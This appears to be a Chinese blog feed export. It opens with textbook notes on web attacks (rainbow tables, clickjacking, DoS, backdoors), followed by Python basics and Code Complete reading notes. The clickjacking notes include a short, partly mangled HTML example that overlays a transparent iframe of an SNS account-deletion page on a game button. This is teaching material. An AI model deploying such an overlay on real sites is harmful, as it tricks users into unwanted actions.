Table）是由明文密码及与之对应的散列值构成的一张数据库表，是一种通过事先制作庞大的彩虹表，可在穷举法 • 字典攻击等实际破解过程中缩短消耗时间的技巧。从彩虹表内搜索散列值就可以推导出对应的明文密码。图：破解已加密的密码 / 彩虹表233为了提高攻击成功率，拥有一张海量数据的彩虹表就成了必不可少的条件。例如在 Free Rainbow Tables 网站上（<a href="http://www.freerainbowtables.com/en/tables2/）公布的一张由大小写字母及数字全排列的" target="_blank" rel="noopener">http://www.freerainbowtables.com/en/tables2/）公布的一张由大小写字母及数字全排列的</a> 1~8 位字符串对应的 MD5 散列值构成的彩虹表，其大小约为 1050 吉字节。拿到密钥使用共享密钥加密方式对密码数据进行加密处理的情况下，如果能通过某种手段拿到加密使用的密钥，也就可以对密码数据解密了。加密算法的漏洞考虑到加密算法本身可能存在的漏洞，利用该漏洞尝试解密也是一种可行的方法。但是要找到那些已广泛使用的加密算法的漏洞，又谈何容易，因此困难极大，不易成功。而 Web 应用开发者独立实现的加密算法，想必尚未经过充分的验证，还是很有可能存在漏洞的。11.5.2　点击劫持点击劫持（Clickjacking）是指利用透明的按钮或链接做成陷阱，覆盖在 Web 页面之上。然后诱使用户在不知情的情况下，点击那个链接访问内容的一种攻击手段。这种行为又称为界面伪装（UIRedressing）。已设置陷阱的 Web 页面，表面上内容并无不妥，但早已埋入想让用户点击的链接。当用户点击到透明的按钮时，实际上是点击了已指定透明属性元素的 iframe 页面。点击劫持的攻击案例下面以 SNS 网站的注销功能为例，讲解点击劫持攻击。利用该注销功能，注册登录的 SNS 用户只需点击注销按钮，就可以从SNS 网站上注销自己的会员身份。234图：点击劫持攻击者在预料用户会点击的 Web 页面上设下陷阱。上图中钓鱼游戏页面上的 PLAY 按钮就是这类陷阱的实例。在做过手脚的 Web 页面上，目标的 SNS 注销功能页面将作为透明层覆盖在游戏网页上。覆盖时，要保证 PLAY 按钮与注销按钮的页面所在位置保持一致。iframe 页面中使用透明可点击按钮的示例&lt;iframe id=”target” src=”<a href="http://sns.example.jp/leave&quot;" target="_blank" rel="noopener">http://sns.example.jp/leave&quot;</a> style=”opaci<button style="position:absolute;top:100;left:100;z-index:-1">PLAY由于 SNS 网站作为透明层被覆盖，SNS 网站上处于登录状态的用户访问这个钓鱼网站并点击页面上的 PLAY 按钮之后，等同于点击了 SNS 网站的注销按钮。11.5.3　DoS 攻击DoS 攻击（Denial of Service attack）是一种让运行中的服务呈停止状态的攻击。有时也叫做服务停止攻击或拒绝服务攻击。DoS 攻击的对象不仅限于 Web 网站，还包括网络设备及服务器等。主要有以下两种 DoS 攻击方式。集中利用访问请求造成资源过载，资源用尽的同时，实际上235服务也就呈停止状态。通过攻击安全漏洞使服务停止。其中，集中利用访问请求的 DoS 攻击，单纯来讲就是发送大量的合法请求。服务器很难分辨何为正常请求，何为攻击请求，因此很难防止 DoS 攻击。图：DoS 攻击多台计算机发起的 DoS 攻击称为 DDoS 攻击（Distributed Denial ofService attack）。DDoS 攻击通常利用那些感染病毒的计算机作为攻击者的攻击跳板。11.5.4　后门程序后门程序（Backdoor）是指开发设置的隐藏入口，可不按正常步骤使用受限功能。利用后门程序就能够使用原本受限制的功能。通常的后门程序分为以下 3 种类型。开发阶段作为 Debug 调用的后门程序开发者为了自身利益植入的后门程序攻击者通过某种方法设置的后门程序236可通过监视进程和通信的状态发现被植入的后门程序。但设定在 Web应用中的后门程序，由于和正常使用时区别不大，通常很难发现。237238目录版权信息 2版权声明 5译者序 6前言 8致谢 9第 1 章　了解 Web 及网络基础 101.1　使用 HTTP 协议访问 Web 101.2　HTTP 的诞生 121.3　网络基础 TCP/IP 151.4　与 HTTP 关系密切的协议 : IP、TCP 和 DNS 191.5　负责域名解析的 DNS 服务 221.6　各种协议与 HTTP 协议的关系 231.7　URI 和 URL 25第 2 章　简单的 HTTP 协议 292.1　HTTP 协议用于客户端和服务器端之间的通信 292.2　通过请求和响应的交换达成通信 302.3　HTTP 是不保存状态的协议 332.4　请求 URI 定位资源 342.5　告知服务器意图的 HTTP 方法 352.6　使用方法下达命令 402.7　持久连接节省通信量 412.8　使用 Cookie 的状态管理 45第 3 章　HTTP 报文内的 HTTP 信息 483.1　HTTP 报文 483.2　请求报文及响应报文的结构 493.3　编码提升传输速率 513.4　发送多种数据的多部分对象集合 533.5　获取部分内容的范围请求 553.6　内容协商返回最合适的内容 57第 4 章　返回结果的 HTTP 状态码 592394.1　状态码告知从服务器端返回的请求结果 594.2　2XX 成功 614.3　3XX 重定向 624.4　4XX 客户端错误 654.5　5XX 服务器错误 67第 5 章　与 HTTP 协作的 Web 服务器 695.1　用单台虚拟主机实现多个域名 695.2　通信数据转发程序 ：代理、网关、隧道 715.3　保存资源的缓存 74第 6 章　HTTP 首部 786.1　HTTP 报文首部 786.2　HTTP 首部字段 806.3　HTTP/1.1 通用首部字段 856.4　请求首部字段 996.5　响应首部字段 1156.6　实体首部字段 1226.7　为 Cookie 服务的首部字段 1286.8　其他首部字段 131第 7 章　确保 Web 安全的 HTTPS 1357.1　HTTP 的缺点 1357.2　HTTP+ 加密 + 认证 + 完整性保护 =HTTPS 142第 8 章　确认访问用户身份的认证 1598.1　何为认证 1598.2　BASIC 认证 1608.3　DIGEST 认证 1628.4　SSL 客户端认证 1658.5　基于表单认证 166第 9 章　基于 HTTP 的功能追加协议 1709.1　基于 HTTP 的协议 1709.2　消除 HTTP 瓶颈的 SPDY 1719.3　使用浏览器进行全双工通信的 WebSocket 1769.4　期盼已久的 HTTP/2.0 1799.5　Web 服务器管理文件的 WebDAV 180240第 10 章　构建 Web 内容的技术 18610.1　HTML 18610.2　动态 HTML 18810.3　Web 应用 19010.4　数据发布的格式及语言 192第 11 章　Web 的攻击技术 19711.1　针对 Web 的攻击技术 19711.2　因输出值转义不完全引发的安全漏洞 20211.3　因设置或设计上的缺陷引发的安全漏洞 22011.4　因会话管理疏忽引发的安全漏洞 22511.5　其他安全漏洞 230目录 3241</button></title></head></html></title></head></html></div></form></s></html></p>]]></content>
      
      
      
        <tags>
            
            <tag> 笔记整理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>字典、元组</title>
      <link href="/cs/%E5%AD%97%E5%85%B8/"/>
      <url>/cs/%E5%AD%97%E5%85%B8/</url>
      
        <content type="html"><![CDATA[<p>列表和元组是数据集合。字典是键值对集合。<br>字典键重合的问题。字典的改和增。<br>列表和元组的索引对应字典的键。<br>键为数字的字典。<br>字典除了用{}申明外，还可以用dict()申明，用<code>dict()</code>时，键不能带引号。否则报错 <code>SyntaxError: keyword can&#39;t be an expression</code><br>学习，思考，应用，校正。人做事情，都需要有个反馈，反馈的周期越久，感觉上就越困难。很多大事情，都是由一个个小事务重复或迭代而成，每个小事务中，包含了反馈和校正<br>列表和元组形式上是[]、()的区别。元组的值不能修改。</p><a id="more"></a><p>定义：数据对集合。<br>申明：字典的关键字必须是唯一的。不能重复。但申明时不会报错。后面的键值对会自动覆盖前面的同名键值对。<br>        <code>{}</code>没写而且没调用<code>dict</code>函数会报错<code>SyntaxError: invalid syntax</code><br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重复的键</span></span><br><span class="line">myDic=&#123;<span class="string">'one'</span>:<span class="number">1</span>,<span class="string">'two'</span>:<span class="number">2</span>,<span class="string">'two'</span>:<span class="number">3</span>&#125; <span class="comment">#重复的键自动覆盖，和字典改数据一个理</span></span><br><span class="line">print(len(myDic)) <span class="comment"># 2</span></span><br><span class="line">print(myDic) <span class="comment"># &#123;'one': 1, 'two': 3&#125;</span></span><br><span class="line"><span class="comment"># &#123;&#125;申明</span></span><br><span class="line">myDic1=&#123;<span class="string">'one'</span>:<span class="number">1</span>,<span class="string">'two'</span>:<span class="number">2</span>,<span class="string">'three'</span>:<span class="number">3</span>&#125; <span class="comment">#键也可以是数字</span></span><br><span class="line">print(myDic1)  <span class="comment"># &#123;'one': 1, 'two': 2, 'three': 3&#125;</span></span><br><span class="line"><span class="comment"># dict()申明</span></span><br><span class="line">myDic2=dict(one=<span class="number">1</span>,two=<span class="number">2</span>,three=<span class="number">3</span>) <span class="comment">#dict函数申明时建不能带引号，否则报错 SyntaxError: keyword can't be an expression</span></span><br><span class="line">print(myDic2) <span class="comment">#&#123;'one': 1, 'two': 2, 'three': 3&#125;</span></span><br></pre></td></tr></table></figure></p><h1 id="查"><a href="#查" class="headerlink" title="查"></a>查</h1><p>dicName[‘keyName’]</p><h1 id="改"><a href="#改" class="headerlink" title="改"></a>改</h1><p>dicName[‘keyName’]=newData</p><h1 id="增"><a href="#增" class="headerlink" title="增"></a>增</h1><p>dicName[‘keyName’]=newData</p><h1 id="删"><a href="#删" class="headerlink" title="删"></a>删</h1><p>del dicName[‘keyName’]</p>]]></content>
      
      
      
        <tags>
            
            <tag> python基础 </tag>
            
            <tag> 数据类型 </tag>
            
            <tag> python数据类型 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基本数据类型</title>
      <link href="/cs/%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
      <url>/cs/%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<p>基本数据类型一览。<br>int()、float()、str()<br><a id="more"></a><a href="/基本数据类型：整数">整数</a><br><a href="/基本数据类型：浮点数">浮点数</a><br><a href="/基本数据类型：字符">字符</a><br><a href="/基本数据类型：字符串">字符串</a><br><a href="/基本数据类型：布尔变量">布尔变量</a><br><a href="/基本数据类型：枚举">枚举</a><br><a href="/基本数据类型：具名常量">具名常量</a><br><a href="/基本数据类型：数组">数组</a><br><a href="/基本数据类型：自定义变量">自定义变量</a></p><h1 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h1><p>int: 浮点型或合适的字符串(只能是整数字符串)<br>float: 整型或合适的字符串(只能是纯数字字符串)<br>str:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int(<span class="string">'2'</span>) <span class="comment">#2</span></span><br><span class="line">int(<span class="number">2.14</span>) <span class="comment">#2 </span></span><br><span class="line">int(<span class="string">'2.14'</span>) <span class="comment">#SyntaxError: invalid character in identifier</span></span><br><span class="line">int(a) <span class="comment">#SyntaxError: invalid character in identifier</span></span><br><span class="line"></span><br><span class="line">float(<span class="number">2</span>) <span class="comment">#2.0</span></span><br><span class="line">float(<span class="string">'2.14'</span>) <span class="comment">#2.14</span></span><br><span class="line"></span><br><span class="line">str(<span class="number">2.14</span>) <span class="comment">#'2.14'</span></span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
        <tags>
            
            <tag> mind </tag>
            
            <tag> 基本数据类型 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>列表</title>
      <link href="/cs/%E5%88%97%E8%A1%A8/"/>
      <url>/cs/%E5%88%97%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<p>Python列表<br><a id="more"></a><br>定义：相关数据的集合。数据的一种保存形式（相对于变量）。<br>索引:<code>list[0]</code>、<code>list[-1]</code><br>申明：<code>[]</code>,英文逗号隔开。<br>空列表（初始化）：<code>list1=[]</code><br>增：<code>list1.append(&#39;a&#39;)</code><br>删：del list1[i]<br>改: 直接list[i]=newdata<br>切片: list[m:n:i] 左闭右开,i为步距。m省略的话，默认为0。n:-1。i:1</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">myList=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="string">'hello'</span>]</span><br><span class="line">print(myList)</span><br><span class="line">print(myList[<span class="number">2</span>])</span><br><span class="line">print(myList[<span class="number">-1</span>])</span><br><span class="line">myList[<span class="number">1</span>]=<span class="number">20</span></span><br><span class="line">print(myList)</span><br><span class="line">myList.append(<span class="number">6</span>)</span><br><span class="line">print(myList)</span><br><span class="line"><span class="keyword">del</span> myList[<span class="number">5</span>]</span><br><span class="line">print(myList)</span><br><span class="line"><span class="comment"># [1, 2, 3, 4, 5, 'hello']</span></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line"><span class="comment"># hello</span></span><br><span class="line"><span class="comment"># [1, 20, 3, 4, 5, 'hello']</span></span><br><span class="line"><span class="comment"># [1, 20, 3, 4, 5, 'hello', 6]</span></span><br><span class="line"><span class="comment"># [1, 20, 3, 4, 5, 6]</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python基础 </tag>
            
            <tag> 数据类型 </tag>
            
            <tag> python数据类型 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>转载：使用Tkinter模块来创建简单的GUI程序</title>
      <link href="/cs/%E4%BD%BF%E7%94%A8Tkinter%E6%A8%A1%E5%9D%97%E6%9D%A5%E5%88%9B%E5%BB%BA%E7%AE%80%E5%8D%95%E7%9A%84GUI%E7%A8%8B%E5%BA%8F/"/>
      <url>/cs/%E4%BD%BF%E7%94%A8Tkinter%E6%A8%A1%E5%9D%97%E6%9D%A5%E5%88%9B%E5%BB%BA%E7%AE%80%E5%8D%95%E7%9A%84GUI%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<p>转载。<br><a id="more"></a><br>学了一段时间python，总想用它来做一个gui的界面程序，嘿嘿，主要是为了炫耀一下啊。<br>下面整理了一些python Tkinter模块的小例子，希望大家能够做一个gui程序出来。<br>使用Tkinter模块来创建简单的GUI程序。<br>Tkinter的Widgets有：Button、Canvas、Checkbutton、Entry、Frame、Label、Listbox、Menu、Menubutton、Message、Radiobutton、Scales、Scrollbar、TEXT、Toplevel等。<br>例：</p>]]></content>
      
      
      
        <tags>
            
            <tag> GUI </tag>
            
            <tag> 转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码样式</title>
      <link href="/cs/%E4%BB%A3%E7%A0%81%E6%A0%B7%E5%BC%8F/"/>
      <url>/cs/%E4%BB%A3%E7%A0%81%E6%A0%B7%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p>很难吗。<br><a id="more"></a></p><h1 id="样式"><a href="#样式" class="headerlink" title="样式"></a>样式</h1><p>Python代码块：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;import nltk</span><br><span class="line">&gt;&gt;&gt;import numpy</span><br></pre></td></tr></table></figure></p><p>一般性的代码块：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add FILE vectorizer.pkl;</span><br><span class="line">add FILE classifier.pkl;</span><br></pre></td></tr></table></figure></p><p>Scrapy shell中的IPython 记法，其样式如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [1] : sel.xpath(&apos;//title/text()&apos;)</span><br><span class="line">Out[1]: [&lt;Selector xpath=&apos;//title/text()&apos; data=u&apos; Google News&apos;&gt;]</span><br></pre></td></tr></table></figure></p><p>所有命令行输入或输出信息的样式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># cp /usr/src/asterisk-addons/configs/cdr_mysql.conf.sample</span><br><span class="line">     /etc/asterisk/cdr_mysql.conf</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
        <tags>
            
            <tag> fix </tag>
            
            <tag> one </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码大全书籍介绍</title>
      <link href="/cs/%E4%BB%A3%E7%A0%81%E5%A4%A7%E5%85%A8%E4%B9%A6%E7%B1%8D%E4%BB%8B%E7%BB%8D/"/>
      <url>/cs/%E4%BB%A3%E7%A0%81%E5%A4%A7%E5%85%A8%E4%B9%A6%E7%B1%8D%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<p>代码大全书籍相关<br><a id="more"></a><br>书中<a href="http://www.cc2e.com/" target="_blank" rel="noopener">代码网址</a>已失效。<br>2006年4月<br>[美]Steve McConnell 金戈<br><img src="https://upload-images.jianshu.io/upload_images/6908911-c94a15af59467ccf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="代码大全联系作者"></p><h2 id="书评"><a href="#书评" class="headerlink" title="书评"></a>书评</h2><p>全面更新、与时俱进<br>绝佳指导书、终极百科全书、百科全书式的手册、<br>宝藏、智慧、财富、巨大宝库<br>特别注重、详细介绍、广泛剖析<br>展示、列举、提供、填补、涵盖、详述 、归纳总结、汇集、整理、归纳统一并广泛传播<br>最易懂<br>翔实、易用、指南<br>提高本书说服力<br>对  都是大有裨益的<br>想  ，阅读本书不会让你失望<br>通向智慧的捷径<br>读起来饶有趣味<br>这无疑是我所看过的  方面最好的书籍<br>每个时代你都会遇到一本书<br>如果你  就该有<br>每个  都该有一本<br>并且每年从头到尾读一遍<br>我每年都读这本书，仍能从中有新的收获<br>十年里 没有出现比 更权威的书。<br>帮助读者用较短的时间较少的麻烦去<br>其风格和内容是切实可用的<br>创新书籍<br>提供你获得经验的捷径<br>节省数年走弯路的时间<br>千言万语都无法说明这本书有多好。<br>标题尚不足以表达出该作品的全部智慧与内涵。<br>我认为是软件构建方面很好的书,每个软件开发人员的书架上都该有这本书<br>每个程序员都该读读这本杰出的书籍。<br>假如你期望成为专业程序员,这将是你投资35美元能得到的最好回报。不要只是看看这<br>个书评,赶快冲出去买一本回来! McConnell声称此书意在拉近业界大师的知识与一般商业实<br>践之间的距离……令人称奇的是他做到了。<br>应当让在软件开发领域中的每个人都来读读《代码大全》<br>我不遗余力地为 Steve McConnell的《代码大全》拍手叫好……这本书取代了API参考手册,成为伴我干活的最亲密的书。<br>这本编纂精良的巨著有望成为软件实现的实践方面最好的专著。<br>该书必将成为一部经典的、所有开发人员及其管理者必备的读物。<br>本书的精华内容<br>在其他书里恐怕很难找到如此详尽的对 的讨论。<br>在过去的10余年中,这本书影响了整整一代程序员“代码大全”四个字已成为一个响当当的名字。<br>这本书用了整整一章(30多页)的篇幅来讲解“为变量命名”这一编程中最常见的活动,这里提供的建议在别的书里是很难见到的。<br>当然,这整本书都非常值得一读,准确地说,值得反复阅读。书中不仅有实实在在的数据和论述,也有一些有趣的比喻,作者偶尔还开开玩笑,读起来一点也不枯燥。<br>本书介绍了一些当今最为时兴的技术,其中有许多还未被广泛采用。<br>正因为本书撷取了实践与研究两者的精髓。萃取了其中的精华<br>经久不衰,受用多年。</p>]]></content>
      
      
      
        <tags>
            
            <tag> mind </tag>
            
            <tag> 代码大全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码大全</title>
      <link href="/cs/%E4%BB%A3%E7%A0%81%E5%A4%A7%E5%85%A8/"/>
      <url>/cs/%E4%BB%A3%E7%A0%81%E5%A4%A7%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<p>代码大全沉思录<br><a id="more"></a></p><h2 id="扬名立万"><a href="#扬名立万" class="headerlink" title="扬名立万"></a>扬名立万</h2><p>畅销书作者<br>杂志主编<br>计算机科学与技术委员会（Computer Science and Technology Board）<br>当艺术评论家聚在一起的时候,他们谈论的都是关于版式、结构以及意蕴之类的话题;而当真正的艺术家聚在起的时候,他们谈论的则是到哪儿才能买到更便宜的松节油。Pable PN毕加索)</p><h2 id="经年累月"><a href="#经年累月" class="headerlink" title="经年累月"></a>经年累月</h2><p>丰富的理论知识研究<br>当今的理论发展水平<br>前沿的开发实践<br>行之有效的编程实践经验技术<br>反映实践状况的产品级代码<br>编程经验、编程技术<br>项目（管理）经验<br>高质量代码习惯<br>实用、有效、强大<br>经验技巧、开发策略<br>软件开发领域<br>思维训练<br>项目思考。需求分析。<br>行动策略。具体情况作出更正确的决策。<br>避免反复陷入完全一样的战斗<br>编程原则是超越特定语言语法的。<br>实质地改善编程质量并提高工作效率</p><h3 id="你在技术浪潮中的位置"><a href="#你在技术浪潮中的位置" class="headerlink" title="你在技术浪潮中的位置"></a>你在技术浪潮中的位置</h3><p>自学程序员<br>经验不足的程序员、学生<br>参加过正规训练的程序员<br>软件开发者<br>一般商业实践<br>学习并掌握不止一门语言是专业程序员职业生涯的分水岭<br>强大的软件开发技术<br>优秀程序员<br>经验丰富的程序员<br>内行<br>软件架构师<br>项目负责人<br>分析师<br>业界研究<br>学术成果、研究成果<br>技术带头人、技术领导<br>专家经验<br>业界大师与教授。有些教授并不实际编写产品代码。教授们写出来的技术内容对于学生们的项目而言还行得通,但他们通常不知道如何在完整规模的开发环境中施展这些技术。</p><p>知识与商业实践大咖<br>软件工程界软件开发领域<br>编程领域的大众技术<br>前卫的软件开发实践迅速发展,但普通的实践手段并没有太大变化。<br>强大的编程技术已在学术论文和期刊里尘封了多年。<br>    软件业界以及学术界的研究人员已经发现了不少行之有效的实践经验，足以解决自20世纪70年代以来编程领域中日益蔓延的大多数问题。<br>    可是这些实践经验很少在高度专业化的技术期刊之外对外发表,所以时至今日大多数编程的机构和组织还没能用上这些技术。<br>有研究表明,一项研发成果从其诞生之日起,到进入商业实践阶段,通常要经历5到15年甚至更长的时间( Raghavan and Chand1989; Rogers1995; Parnas199)。<br>让那些关键性的研发成果现在就能为更多编程人员所用。</p><h1 id="阅读顺序"><a href="#阅读顺序" class="headerlink" title="阅读顺序"></a>阅读顺序</h1><h2 id="初级程序员"><a href="#初级程序员" class="headerlink" title="初级程序员"></a>初级程序员</h2><p>第18章“表驱动法”:将复杂的逻辑判断转换为查表,从而简化代码的编写与维护。另外,本章中的一个示例说明了,面向对象设计并不只要因为它是“面向对象”,就一定会好于其他的设计。</p><h2 id="高级程序员"><a href="#高级程序员" class="headerlink" title="高级程序员"></a>高级程序员</h2><p>第4章“关键的‘构建’决策”,本章关注的焦点是程序员和技术带头人个人必须(直接或间接)负责的项目准备工作</p><h2 id="项目经理"><a href="#项目经理" class="headerlink" title="项目经理"></a>项目经理</h2><p>第33章“个人性格”,程序设计是一项纯粹的脑力劳动,本章对挑选和培养优秀程序员提出了建议。<br>事实证明,相对于聪明程度(智商),个人性格(情商)对于造就出程序员高手更具有决定性的意义。</p><h2 id="低年级学生"><a href="#低年级学生" class="headerlink" title="低年级学生"></a>低年级学生</h2><p>第11章“变量名的力量”。</p><h2 id="高年级学生"><a href="#高年级学生" class="headerlink" title="高年级学生"></a>高年级学生</h2><p>第8章“防御式编程”<br>本章讲述如何面对严酷的充斥非法数据的真实世界,在遇到“绝不会发生”的事件和其他程序员犯下的错误时如何保护自己。<br>对于那些正在从学术环境转向专业开发环境的学生来说,这是必备的一课。</p><h2 id="制定编码标准的人"><a href="#制定编码标准的人" class="headerlink" title="制定编码标准的人"></a>制定编码标准的人</h2><p>看第32章“自说明代码”,<br>本章中有一段关于注释的精彩对话,它可能会改变您在制定编码标准时对注释的要求。</p><h2 id="自学编程的人"><a href="#自学编程的人" class="headerlink" title="自学编程的人"></a>自学编程的人</h2><p>第7章“高质量的子程序”,<br>本章详细讨论了子程序的命名和参数选择等问题,其中对子程序最佳长度的讨论颇有借鉴意义</p><h2 id="喜欢参与网上争论的人"><a href="#喜欢参与网上争论的人" class="headerlink" title="喜欢参与网上争论的人"></a>喜欢参与网上争论的人</h2><p>第13.3节“全局数据”和第17.3节“goto语句”,听听学术界在这些问题上的争论也挺有意思。</p><h1 id="立言"><a href="#立言" class="headerlink" title="立言"></a>立言</h1><p>他可是有切身经验的<br>有充分的理由相信<br>重要里程碑<br>最有价值<br>智慧传承<br>猎取收集</p><h1 id="导图"><a href="#导图" class="headerlink" title="导图"></a>导图</h1><h2 id="导图-1"><a href="#导图-1" class="headerlink" title="导图"></a>导图</h2><p>新语言<br>新开发过程<br>新方法论<br>设计<br>编程技术<br>编程思维方式<br>编程风格<br>编程工艺、软件工艺<br>软件项目<br>软件构建（活动、技术和诀窍）<br>构建细节：创建类的步骤<br>每个层次的注意事项<br>软件架构<br>编码标准<br>测试、系统测试<br>调试、重构、代码调优的技术和策略等<br>集成<br>高质量软件<br>提高软件质量是降低开发成本的重要途径</p><h1 id="指标：在更短的时间内写出更棒的程序"><a href="#指标：在更短的时间内写出更棒的程序" class="headerlink" title="指标：在更短的时间内写出更棒的程序"></a>指标：在更短的时间内写出更棒的程序</h1><p>优秀<br>开发效率<br>健壮<br>弹性<br>安全<br>规范<br>漏洞少，遇到的问题更少。为什么会遇到那些问题,如何在将来避免它们。反复尝试和试错的结晶。<br>交付快，更快速地进行开发<br>预算不超<br>用户的需求<br>掌控更大型的项目<br>项目的需求发生变动时帮助你成功地维护并修改已经开发出来的软件</p><h1 id="软件的首要技术使命"><a href="#软件的首要技术使命" class="headerlink" title="软件的首要技术使命"></a>软件的首要技术使命</h1><p>初级编程与高级编程</p><h2 id="编程基本要素及checklist-评估表"><a href="#编程基本要素及checklist-评估表" class="headerlink" title="编程基本要素及checklist 评估表"></a>编程基本要素及checklist 评估表</h2><p>软件架构<br>设计方法<br>类和子程序的命名和质量<br>代码可读性<br>变量、变量命名<br>类和函数命名<br>语句<br>数据类型<br>控制结构<br>设计<br>代码格式<br>代码布局<br>项目管理方法<br>需求<br>测试、测试用例<br>什么是可行<br>什么是不可行的<br>分阶段( phase)进行、还是迭代式(interation)进行<br>构建错误、需求分析错误、架构错误<br>潜心分析需求<br>精心设计架构<br>脚踏实地测试</p><h2 id="有效开发实践"><a href="#有效开发实践" class="headerlink" title="有效开发实践"></a>有效开发实践</h2><p>防御式编程、表驱动法、协同构建、开发者测试、性能优化</p><p>软件开发技术信息来源</p><p>##<br>链接各种数据库的代码<br>常用的js代码</p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>代码补全功能是如何实现的<br>子程序是中国特色吗</p><h1 id="草稿"><a href="#草稿" class="headerlink" title="草稿"></a>草稿</h1><h1 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h1><p>《Java编程入门》<br>《高级Java编程》<br>《高高级Java编程》<br>Intel或 Motorola的硬件参考手册<br>Microsoft Windows或 Linux操作系统的函数手册</p><h2 id="构建"><a href="#构建" class="headerlink" title="构建"></a>构建</h2><h2 id="专业经验"><a href="#专业经验" class="headerlink" title="专业经验"></a>专业经验</h2><h2 id="其他软件著作"><a href="#其他软件著作" class="headerlink" title="其他软件著作"></a>其他软件著作</h2><h2 id="编程语言书籍"><a href="#编程语言书籍" class="headerlink" title="编程语言书籍"></a>编程语言书籍</h2><h2 id="杂志上的文章"><a href="#杂志上的文章" class="headerlink" title="杂志上的文章"></a>杂志上的文章</h2><h2 id="技术参考资料"><a href="#技术参考资料" class="headerlink" title="技术参考资料"></a>技术参考资料</h2>]]></content>
      
      
      
        <tags>
            
            <tag> mind </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三思而后行</title>
      <link href="/cs/%E4%B8%89%E6%80%9D%E8%80%8C%E5%90%8E%E8%A1%8C/"/>
      <url>/cs/%E4%B8%89%E6%80%9D%E8%80%8C%E5%90%8E%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<p>代码大全之准备工作。<br><a id="more"></a></p><h1 id="必备工具"><a href="#必备工具" class="headerlink" title="必备工具"></a>必备工具</h1><p>在开始建造房子之前,审视：<br>蓝图(包含所有细节信息的设计详图)<br>全部(建筑)许可证<br>测量房屋的地基<br>Caper Jones是 Software Productivity Research(软件生产率研究)的首席科学家,他回顾20年的软件研究,指出他和同事见过不止<br>700种不同的编程语言,<br>40种收集需求的方法、<br>50种进行软件设计的方法、<br>30种针对项目的测试方法( Jones2003)。<br>三种主调的无数变奏：项目类型与典型实践<br>需求、架构、计划、编程、测试、质量保证</p><h1 id="方案选择"><a href="#方案选择" class="headerlink" title="方案选择"></a>方案选择</h1><p>无论何种项目,都会对“准备工作”进行剪裁,使之符合项目的特定需要;在构建活动开始之前,准备工作要做周全：<br>建造摩天大楼用一种方法,<br>建造普通住宅用另一种方法,<br>建造犬舍用第三种方法。<br><img src="https://upload-images.jianshu.io/upload_images/6908911-845325aae45e6355.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="项目种类与典型实践"><br><img src="https://upload-images.jianshu.io/upload_images/6908911-5b9431db2a2cfc27.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="项目种类与典型实践"></p><p>高迭代式与序列式<br>性命攸关的系统往往要求采用更加序列式的方法—“需求稳定”是确保“超高等级的可靠性”的必备条件之<br><img src="https://upload-images.jianshu.io/upload_images/6908911-22da391925683288.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="无准备的序列式与迭代式"><br><img src="https://upload-images.jianshu.io/upload_images/6908911-39c48db18b0494d2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="有装备的序列式与迭代式"><br><img 